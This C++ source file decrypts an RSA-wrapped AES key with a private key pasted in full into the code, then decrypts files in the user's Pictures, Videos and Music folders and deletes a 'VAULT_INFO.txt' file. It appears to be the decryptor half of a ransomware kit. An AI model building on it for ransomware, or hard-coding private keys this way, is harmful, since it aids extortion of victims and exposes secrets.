#include "Decryptor.h"
#include "AESDecryptor.h"
#include <iostream>
#include <vector>
#include <cstdio>

int main() {
    // PASTE YOUR RSA PRIVATE KEY HERE
    const std::string rsaPrivateKeyStr = R"(
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCmRuiN64VhRBRR
Rk8brKPiqmSgh5PXmZePGPfiVl6ZQeviX++60vmhYuxhjaHNtz+2qjGb82/MaMxk
v3hWOLQ88L70hs+vl8dCqCWEwy0v2PrvXwczKzyZpO/hJKCNyvTmP0se97rDs4B+
OGExsKdRo8JV/98N6EhqYI3Ln10K/h38brGY1DtrrCuikYf+OncTVUw2eq2pG7UL
4/N7vYjrF5mIbZSuMzu6PxXnTQ2SMHKOwtupWnyBPH7hTEY2EGP1fxCwddI7Dybv
IuBzkPS85MSd00AFQ7IQ8r67ELAQluRdQemE+5kjBWoTGmaoq4lrv/ltoQlwgYTp
7jM2O5oLAgMBAAECggEAE3ziCqgc5M521yO3Z9XvC0TPMGVTdYRh1/qkKtnWkn3A
aLK3xRyu9zRB4hkYaqTcicser1lzs/BgbDponypcLXxF1SDrvHe8edp9Mzcw15fF
qUJo9J1Pp+5F0wxY6OVtmIK4ijOcpw0ltSVkds9ufMoFn9CyUs3zlswkMkZGQGBh
aUH28GdihhQyvPq7KM/TsAXGqwhHbjyTZTQEZ/iZXpVQky6l3QgZWlGkeGtEyRBU
xpGGOI/I4Kb/wcIDZPFKKAiG6kDEpe2vzl1FKHkKGQGD4nHAq3lF73cxhaRGUdMj
VJjiSa7W/HBJzBgbztszfClg33uZ0TGr7TG8b9uPQQKBgQDo9OYPtjSi4K1TRO6F
f3r3kzxCHP3wK1IcP7f/dQ9yU59tKjvPqADgTs7ylJwaf+k/j/9/dOZfLi2E2/yU
Cu0j+EHP9UDWxDtauwx+p4KffJboo7pJ5vGgHmzcgBlPBsHGSeJT5uanI08RX9U6
fp+CgU9TuGYO8VzCFCIjX79RqwKBgQC2uX9+YKmybJNMcdoQirauu4qRfQJoSQcI
0tto+lkfDRkUlnrKu/Di2tLdkDmogNweVaRN+HYQ+mhRat9Wv6D/OGAd4GEc+Eyf
xjL+hMI5UeotCM7EatiJ+UjTTe/yrsu2qiWHd5Ujv/HdPKfL2DlX05S1RvZYF1/I
X0pbkyk5IQKBgQCfKsUOMyYfq3eBj3WRTRrNkZH4ciqnMFI37ule57KYIL6rLdIT
/ewrVm1bnWJTUNYjkdW2Vj8ZBUogntYiqJyCmRsOZbnZg9YyFd9hoj5DjjLl3Qhp
ehvZlTA4MGYacrlvLAgx32/0/tEFQ/9CqkV+O6/hufoxd4QzLuJsXP0xZQKBgDSc
mJ8Uyge7x3W9WmJk7lDFYxKdAfJxBHt/6vkBDGQqa0xIP7bcAnHvO8Pb4R4pbDe3
xQVGQwiEcUDwGrpplrulydcQYiXrQHTIpqouI5ZJhbnNzWs0sICZrGRbDnm75qAD
waaNwf13KPbgnhfNfEVTgH/pnMikgkm5Vjmj17zBAoGAGHnk1pR9u6PGsizlLkk4
Uq1wxprLSAB6yZyY8iefUax6x0cVhWnAtgN2W5obrHDO/9+q2hAipdaELq74Eym9
8QbvFSOmGo3yG8gvYMwArTskHfi6TvFcWW5YKotsZva96EU2wHALueCtto8wBFGD
vhaPunlAoI0JCWVWZKNAdaw=
-----END PRIVATE KEY-----
    )";

    // ENCRYPTED KEY FILE AND THE OUTPUT FILE FOR THE DECRYPTED AES KEY
    const std::string encryptedKeyFile = "encrypted_key.bin";
    const std::string decryptedKeyFile = "aes_key.bin";

    try {
        Decryptor decryptor(rsaPrivateKeyStr, encryptedKeyFile, decryptedKeyFile);
        decryptor.decrypt();
    }
    catch (const std::exception& e) {
        return 1;
    }


    AESDecryptor decryptor;
    std::vector<std::string> directories = {
        decryptor.GetKnownFolderPath(FOLDERID_Pictures),
        decryptor.GetKnownFolderPath(FOLDERID_Videos),
        decryptor.GetKnownFolderPath(FOLDERID_Music)
        // ADD DIRS / DRIVES AS NEEDED
    };

    for (const auto& directory : directories) {
        decryptor.decryptFilesInDirectory(directory);
    }
    if (std::remove("aes_key.bin") == 0) {}
    if (std::remove("VAULT_INFO.txt") == 0) {}

    return 0;
}
